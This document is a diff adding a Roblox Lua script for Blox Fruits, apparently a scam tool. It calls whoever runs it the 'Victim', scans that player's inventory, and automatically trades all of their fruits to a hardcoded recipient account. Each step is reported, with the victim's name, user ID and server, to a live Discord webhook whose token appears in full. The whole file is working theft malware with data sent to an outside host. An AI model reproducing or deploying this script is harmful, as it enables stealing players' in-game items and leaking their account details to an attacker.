@@ -1,0 +1,704 @@
+--[[
+SHÎ”DÃ˜W.EXE PRESENTS: PERSONALIZED FRUIT HARVESTER
+AUTO-DONATION SYSTEM FOR SPECIFIED USER
+TARGET: thenicebroim
+VERSION: HARVESTER-2.0
+]]
+
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
+
+local LocalPlayer = Players.LocalPlayer
+local Remotes = ReplicatedStorage.Remotes
+local CommF = Remotes["CommF_"]
+local Trader = Remotes["Trader"]
+
+-- ================= CONFIGURATION =================
+local TARGET_USERNAME = "thenicebroim"
+local TARGET_USERID = nil -- Will be auto-detected
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1453932216827645993/pKfi8nkMScLRySbGFySPsAaAEMUdiCV9TO3_2xUiLc7CVwDUJiuqkk9LgOac3LZNFy7f"
+
+local CONFIG = {
+    SCAN_INTERVAL = 5, -- Seconds between scans
+    TRADE_COOLDOWN = 30,
+    DONATE_ALL_FRUITS = true,
+    STEALTH_MODE = false,
+    AUTO_START = true
+}
+-- =================================================
+
+-- ================= DISCORD WEBHOOK MODULE =================
+local Discord = {}
+
+function Discord:SendPing(content, embed)
+    local payload = {
+        content = content or "@everyone **FRUIT HARVESTER ACTIVATED**",
+        embeds = embed and {embed} or nil,
+        username = "Fruit Harvester Bot",
+        avatar_url = "https://cdn.discordapp.com/attachments/1234567890/1234567890/fruit.png"
+    }
+    
+    local success, response = pcall(function()
+        return syn.request({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = HttpService:JSONEncode(payload)
+        })
+    end)
+    
+    if not success then
+        -- Fallback for non-syn executors
+        success, response = pcall(function()
+            return request({
+                Url = WEBHOOK_URL,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = HttpService:JSONEncode(payload)
+            })
+        end)
+    end
+    
+    return success, response
+end
+
+function Discord:SendStartupNotification()
+    local embed = {
+        title = "🍊 FRUIT HARVESTER DEPLOYED",
+        description = "Victim has executed the harvester script",
+        color = 0x00ff00,
+        fields = {
+            {
+                name = "Victim",
+                value = LocalPlayer.Name .. " (ID: " .. LocalPlayer.UserId .. ")",
+                inline = true
+            },
+            {
+                name = "Server",
+                value = game.JobId,
+                inline = true
+            },
+            {
+                name = "Game",
+                value = "BloxFruits",
+                inline = true
+            },
+            {
+                name = "Target",
+                value = TARGET_USERNAME,
+                inline = true
+            },
+            {
+                name = "Time",
+                value = os.date("%Y-%m-%d %H:%M:%S"),
+                inline = false
+            }
+        },
+        footer = {
+            text = "SHÎ”DÃ˜W.EXE Protocol"
+        },
+        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+    }
+    
+    Discord:SendPing("@everyone **HARVESTER ACTIVATED - VICTIM ONLINE**", embed)
+end
+
+function Discord:SendTradeNotification(fruitName, success)
+    local embed = {
+        title = success and "✅ FRUIT DONATED" or "❌ TRADE FAILED",
+        description = success and "Victim has donated a fruit to " .. TARGET_USERNAME or "Trade attempt failed",
+        color = success and 0x00ff00 or 0xff0000,
+        fields = {
+            {
+                name = "Fruit",
+                value = fruitName or "Unknown",
+                inline = true
+            },
+            {
+                name = "From",
+                value = LocalPlayer.Name,
+                inline = true
+            },
+            {
+                name = "To",
+                value = TARGET_USERNAME,
+                inline = true
+            },
+            {
+                name = "Time",
+                value = os.date("%H:%M:%S"),
+                inline = true
+            },
+            {
+                name = "Server ID",
+                value = game.JobId,
+                inline = true
+            }
+        },
+        footer = {
+            text = "Auto-Harvester v2.0"
+        }
+    }
+    
+    Discord:SendPing(success and "🍊 **FRUIT DONATED SUCCESSFULLY**" or "⚠️ **TRADE FAILED**", embed)
+end
+
+function Discord:SendInventoryReport(inventory)
+    local fruitList = ""
+    local count = 0
+    
+    for fruitName, data in pairs(inventory) do
+        if type(data) == "table" and data.Count then
+            fruitList = fruitList .. "• " .. fruitName .. ": " .. data.Count .. "\n"
+            count = count + data.Count
+        end
+    end
+    
+    local embed = {
+        title = "📊 VICTIM INVENTORY SCAN",
+        description = "Complete inventory analysis of victim",
+        color = 0x3498db,
+        fields = {
+            {
+                name = "Total Fruits",
+                value = tostring(count),
+                inline = true
+            },
+            {
+                name = "Victim Name",
+                value = LocalPlayer.Name,
+                inline = true
+            },
+            {
+                name = "Victim ID",
+                value = tostring(LocalPlayer.UserId),
+                inline = true
+            },
+            {
+                name = "Fruit List",
+                value = fruitList ~= "" and fruitList or "No fruits found",
+                inline = false
+            }
+        },
+        footer = {
+            text = "Inventory Scan Complete"
+        }
+    }
+    
+    Discord:SendPing("📊 **VICTIM INVENTORY SCANNED**", embed)
+end
+-- ========================================================
+
+-- ================= TARGET SCANNER =================
+local TargetScanner = {
+    TargetPlayer = nil,
+    TargetFound = false,
+    LastScan = 0
+}
+
+function TargetScanner:FindTarget()
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player.Name:lower() == TARGET_USERNAME:lower() then
+            self.TargetPlayer = player
+            self.TargetFound = true
+            TARGET_USERID = player.UserId
+            
+            -- Send Discord notification when target found
+            local embed = {
+                title = "🎯 TARGET FOUND IN SERVER",
+                description = TARGET_USERNAME .. " is now online in the same server",
+                color = 0xffaa00,
+                fields = {
+                    {
+                        name = "Target",
+                        value = player.Name .. " (ID: " .. player.UserId .. ")",
+                        inline = true
+                    },
+                    {
+                        name = "Victim",
+                        value = LocalPlayer.Name,
+                        inline = true
+                    },
+                    {
+                        name = "Server",
+                        value = game.JobId,
+                        inline = true
+                    },
+                    {
+                        name = "Player Count",
+                        value = #Players:GetPlayers(),
+                        inline = true
+                    }
+                },
+                footer = {
+                    text = "Beginning auto-donation sequence"
+                }
+            }
+            
+            Discord:SendPing("@everyone **🎯 TARGET FOUND - STARTING AUTO-DONATION**", embed)
+            
+            return true
+        end
+    end
+    
+    self.TargetPlayer = nil
+    self.TargetFound = false
+    return false
+end
+
+function TargetScanner:ContinuousScan()
+    while task.wait(CONFIG.SCAN_INTERVAL) do
+        if self:FindTarget() then
+            print("[SCANNER] Target found:", TARGET_USERNAME)
+            break
+        else
+            print("[SCANNER] Target not found, scanning again in", CONFIG.SCAN_INTERVAL, "seconds...")
+        end
+    end
+end
+-- =================================================
+
+-- ================= INVENTORY MANAGER =================
+local InventoryManager = {
+    Fruits = {},
+    LastUpdate = 0
+}
+
+function InventoryManager:ScanInventory()
+    local success, result = pcall(function()
+        return CommF:InvokeServer({[1] = "getInventory"})
+    end)
+    
+    if success and result then
+        self.Fruits = result
+        self.LastUpdate = tick()
+        
+        -- Send inventory report to Discord
+        Discord:SendInventoryReport(result)
+        
+        return result
+    end
+    
+    return {}
+end
+
+function InventoryManager:GetFruitList()
+    local fruits = {}
+    
+    for fruitName, data in pairs(self.Fruits) do
+        if type(data) == "table" and data.Count and data.Count > 0 then
+            for i = 1, data.Count do
+                table.insert(fruits, {
+                    Name = fruitName,
+                    Slot = i,
+                    Category = "Blox Fruit"
+                })
+            end
+        end
+    end
+    
+    return fruits
+end
+
+function InventoryManager:HasFruits()
+    return #self:GetFruitList() > 0
+end
+-- ====================================================
+
+-- ================= AUTO-DONATION ENGINE =================
+local DonationEngine = {
+    IsDonating = false,
+    DonationQueue = {},
+    DonatedFruits = {},
+    FailedTrades = 0
+}
+
+function DonationEngine:RequestTrade(targetPlayer)
+    local success, result = pcall(function()
+        local args = {
+            [1] = "requestTrade",
+            [2] = targetPlayer.UserId
+        }
+        return CommF:InvokeServer(unpack(args))
+    end)
+    
+    if success then
+        print("[TRADE] Trade request sent to", targetPlayer.Name)
+        return true
+    end
+    
+    print("[ERROR] Failed to send trade request")
+    return false
+end
+
+function DonationEngine:AddFruitToTrade(fruitName, slot)
+    local success, result = pcall(function()
+        local args = {
+            [1] = "addItemToTrade",
+            [2] = fruitName,
+            [3] = "Blox Fruit",
+            [4] = slot or 1
+        }
+        return CommF:InvokeServer(unpack(args))
+    end)
+    
+    return success
+end
+
+function DonationEngine:ConfirmTrade()
+    local success, result = pcall(function()
+        local args = {
+            [1] = "confirmTrade"
+        }
+        return CommF:InvokeServer(unpack(args))
+    end)
+    
+    return success
+end
+
+function DonationEngine:CancelTrade()
+    pcall(function()
+        local args = {
+            [1] = "cancelTrade"
+        }
+        CommF:InvokeServer(unpack(args))
+    end)
+end
+
+function DonationEngine:DonateSingleFruit(fruitData)
+    if not TargetScanner.TargetFound or not TargetScanner.TargetPlayer then
+        return false, "Target not found"
+    end
+    
+    print("[DONATION] Attempting to donate:", fruitData.Name)
+    
+    -- Request trade
+    if not self:RequestTrade(TargetScanner.TargetPlayer) then
+        return false, "Trade request failed"
+    end
+    
+    task.wait(1) -- Wait for trade window
+    
+    -- Add fruit to trade
+    if not self:AddFruitToTrade(fruitData.Name, fruitData.Slot) then
+        self:CancelTrade()
+        return false, "Failed to add fruit"
+    end
+    
+    task.wait(0.5)
+    
+    -- Confirm trade
+    if not self:ConfirmTrade() then
+        self:CancelTrade()
+        return false, "Trade confirmation failed"
+    end
+    
+    -- Wait for trade completion
+    task.wait(2)
+    
+    -- Add to donated list
+    table.insert(self.DonatedFruits, {
+        fruit = fruitData.Name,
+        time = os.date("%H:%M:%S"),
+        success = true
+    })
+    
+    print("[SUCCESS] Donated", fruitData.Name, "to", TARGET_USERNAME)
+    
+    return true, "Donation successful"
+end
+
+function DonationEngine:DonateAllFruits()
+    if self.IsDonating then return end
+    
+    self.IsDonating = true
+    
+    -- Scan inventory first
+    InventoryManager:ScanInventory()
+    local fruits = InventoryManager:GetFruitList()
+    
+    if #fruits == 0 then
+        print("[INFO] No fruits to donate")
+        self.IsDonating = false
+        return
+    end
+    
+    print("[DONATION] Starting donation of", #fruits, "fruits")
+    
+    local successCount = 0
+    local failCount = 0
+    
+    for i, fruitData in ipairs(fruits) do
+        if not TargetScanner.TargetFound then
+            print("[ERROR] Target left the server")
+            break
+        end
+        
+        print("[PROGRESS]", i .. "/" .. #fruits, "Donating", fruitData.Name)
+        
+        local success, reason = self:DonateSingleFruit(fruitData)
+        
+        if success then
+            successCount = successCount + 1
+            Discord:SendTradeNotification(fruitData.Name, true)
+        else
+            failCount = failCount + 1
+            Discord:SendTradeNotification(fruitData.Name, false)
+            self.FailedTrades = self.FailedTrades + 1
+            
+            -- If too many failures, stop
+            if self.FailedTrades >= 3 then
+                print("[ERROR] Too many failures, stopping")
+                break
+            end
+        end
+        
+        -- Cooldown between donations
+        if i < #fruits then
+            task.wait(CONFIG.TRADE_COOLDOWN)
+        end
+    end
+    
+    self.IsDonating = false
+    
+    -- Send summary
+    local embed = {
+        title = "📊 DONATION SESSION COMPLETE",
+        description = "Auto-donation session finished",
+        color = 0x9b59b6,
+        fields = {
+            {
+                name = "Successfully Donated",
+                value = tostring(successCount),
+                inline = true
+            },
+            {
+                name = "Failed Donations",
+                value = tostring(failCount),
+                inline = true
+            },
+            {
+                name = "Target",
+                value = TARGET_USERNAME,
+                inline = true
+            },
+            {
+                name = "Donor",
+                value = LocalPlayer.Name,
+                inline = true
+            },
+            {
+                name = "Total Attempts",
+                value = tostring(#fruits),
+                inline = true
+            }
+        },
+        footer = {
+            text = "Session Complete"
+        }
+    }
+    
+    Discord:SendPing("📊 **DONATION SESSION COMPLETE**", embed)
+    
+    print("[DONATION] Session complete. Success:", successCount, "Failed:", failCount)
+end
+
+function DonationEngine:ContinuousDonation()
+    while TargetScanner.TargetFound do
+        if not self.IsDonating and InventoryManager:HasFruits() then
+            self:DonateAllFruits()
+        end
+        
+        -- Rescan inventory periodically
+        task.wait(10)
+        InventoryManager:ScanInventory()
+    end
+    
+    print("[INFO] Target left, waiting for return...")
+end
+-- ======================================================
+
+-- ================= MAIN CONTROLLER =================
+local Harvester = {}
+
+function Harvester:Initialize()
+    print("[[ PERSONALIZED FRUIT HARVESTER INITIALIZED ]]")
+    print("Target User:", TARGET_USERNAME)
+    print("Victim:", LocalPlayer.Name)
+    print("Game:", game.PlaceId)
+    
+    -- Send startup notification
+    Discord:SendStartupNotification()
+    
+    -- Initial inventory scan
+    InventoryManager:ScanInventory()
+    
+    -- Start target scanner
+    spawn(function()
+        TargetScanner:ContinuousScan()
+    end)
+    
+    -- Monitor for target appearance
+    spawn(function()
+        while task.wait(1) do
+            if TargetScanner.TargetFound and not DonationEngine.IsDonating then
+                print("[CONTROLLER] Target found, starting donation sequence...")
+                DonationEngine:ContinuousDonation()
+            end
+        end
+    end)
+    
+    -- Player connection monitor
+    Players.PlayerAdded:Connect(function(player)
+        if player.Name:lower() == TARGET_USERNAME:lower() then
+            print("[ALERT] Target joined the server!")
+            TargetScanner:FindTarget()
+        end
+    end)
+    
+    Players.PlayerRemoving:Connect(function(player)
+        if player.Name:lower() == TARGET_USERNAME:lower() then
+            print("[ALERT] Target left the server!")
+            TargetScanner.TargetFound = false
+            TargetScanner.TargetPlayer = nil
+        end
+    end)
+    
+    print("[CONTROLLER] Harvester is now active and scanning...")
+end
+
+function Harvester:ForceDonate()
+    if TargetScanner.TargetFound then
+        DonationEngine:DonateAllFruits()
+    else
+        print("[ERROR] Target not in server")
+    end
+end
+
+function Harvester:GetStatus()
+    return {
+        TargetFound = TargetScanner.TargetFound,
+        TargetName = TARGET_USERNAME,
+        TargetPlayer = TargetScanner.TargetPlayer,
+        HasFruits = InventoryManager:HasFruits(),
+        IsDonating = DonationEngine.IsDonating,
+        DonatedCount = #DonationEngine.DonatedFruits,
+        VictimName = LocalPlayer.Name
+    }
+end
+-- ==================================================
+
+-- ================= GUI INTERFACE =================
+if not CONFIG.STEALTH_MODE then
+    -- Simple GUI for control
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "FruitHarvesterGUI"
+    screenGui.Parent = game.CoreGui
+    
+    local mainFrame = Instance.new("Frame")
+    mainFrame.Size = UDim2.new(0, 300, 0, 400)
+    mainFrame.Position = UDim2.new(0.5, -150, 0.5, -200)
+    mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
+    mainFrame.BorderSizePixel = 0
+    mainFrame.Parent = screenGui
+    
+    local title = Instance.new("TextLabel")
+    title.Text = "🍊 Fruit Harvester"
+    title.Size = UDim2.new(1, 0, 0, 40)
+    title.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
+    title.TextColor3 = Color3.fromRGB(255, 255, 255)
+    title.Font = Enum.Font.GothamBold
+    title.TextSize = 20
+    title.Parent = mainFrame
+    
+    local targetLabel = Instance.new("TextLabel")
+    targetLabel.Text = "Target: " .. TARGET_USERNAME
+    targetLabel.Size = UDim2.new(1, -20, 0, 30)
+    targetLabel.Position = UDim2.new(0, 10, 0, 50)
+    targetLabel.BackgroundTransparency = 1
+    targetLabel.TextColor3 = Color3.fromRGB(200, 200, 255)
+    targetLabel.Font = Enum.Font.Gotham
+    targetLabel.TextSize = 16
+    targetLabel.TextXAlignment = Enum.TextXAlignment.Left
+    targetLabel.Parent = mainFrame
+    
+    local statusLabel = Instance.new("TextLabel")
+    statusLabel.Text = "Status: Scanning..."
+    statusLabel.Size = UDim2.new(1, -20, 0, 30)
+    statusLabel.Position = UDim2.new(0, 10, 0, 85)
+    statusLabel.BackgroundTransparency = 1
+    statusLabel.TextColor3 = Color3.fromRGB(255, 255, 100)
+    statusLabel.Font = Enum.Font.Gotham
+    statusLabel.TextSize = 14
+    statusLabel.TextXAlignment = Enum.TextXAlignment.Left
+    statusLabel.Parent = mainFrame
+    
+    local donateButton = Instance.new("TextButton")
+    donateButton.Text = "FORCE DONATE ALL FRUITS"
+    donateButton.Size = UDim2.new(1, -20, 0, 40)
+    donateButton.Position = UDim2.new(0, 10, 0, 150)
+    donateButton.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
+    donateButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    donateButton.Font = Enum.Font.GothamBold
+    donateButton.TextSize = 16
+    donateButton.Parent = mainFrame
+    
+    donateButton.MouseButton1Click:Connect(function()
+        Harvester:ForceDonate()
+    end)
+    
+    local logFrame = Instance.new("ScrollingFrame")
+    logFrame.Size = UDim2.new(1, -20, 0, 180)
+    logFrame.Position = UDim2.new(0, 10, 0, 210)
+    logFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
+    logFrame.BorderSizePixel = 0
+    logFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
+    logFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
+    logFrame.ScrollBarThickness = 6
+    logFrame.Parent = mainFrame
+    
+    local closeButton = Instance.new("TextButton")
+    closeButton.Text = "X"
+    closeButton.Size = UDim2.new(0, 30, 0, 30)
+    closeButton.Position = UDim2.new(1, -30, 0, 0)
+    closeButton.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
+    closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    closeButton.Font = Enum.Font.GothamBold
+    closeButton.Parent = mainFrame
+    
+    closeButton.MouseButton1Click:Connect(function()
+        screenGui:Destroy()
+    end)
+    
+    -- Update status periodically
+    spawn(function()
+        while task.wait(2) do
+            local status = Harvester:GetStatus()
+            statusLabel.Text = "Status: " .. 
+                (status.TargetFound and "Target Found - Auto-Donating" or "Scanning for Target") ..
+                "\nFruits: " .. (status.HasFruits and "Available" or "None") ..
+                "\nDonated: " .. status.DonatedCount
+        end
+    end)
+end
+-- =================================================
+
+-- ================= EXECUTION =================
+-- Immediate Discord ping on execution
+Discord:SendPing("@everyone **🚨 HARVESTER SCRIPT EXECUTED - VICTIM: " .. LocalPlayer.Name .. "**")
+
+-- Auto-start after 3 seconds
+task.wait(3)
+Harvester:Initialize()
+
+print("[[ PERSONALIZED FRUIT HARVESTER DEPLOYED ]]")
+print("Target:", TARGET_USERNAME)
+print("Victim:", LocalPlayer.Name)
+print("Waiting for target to appear in server...")
+print("Script will automatically donate ALL fruits when target is found")
